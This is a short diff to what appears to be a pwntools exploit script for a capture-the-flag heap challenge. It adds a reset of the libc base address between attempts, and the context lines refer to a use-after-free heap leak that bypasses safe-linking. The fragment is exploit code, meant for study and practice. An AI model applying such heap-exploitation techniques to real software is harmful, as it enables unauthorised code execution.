@@ -110,8 +110,9 @@ def leak_qword(addr):
 
 def attempt():
     global io
-    io = start()
-    gate()
+    libc.address = 0          # reset per attempt: libc is reused, so un-rebase
+    io = start()              # symbols before recomputing base (otherwise attempt
+    gate()                    # 2+ subtract an already-rebased libc.sym -> garbage)
 
     # ---- 1. safe-linking heap leak via recycle-bin UAF ----
     add(0x20, b"A\n"); add(0x20, b"B\n")
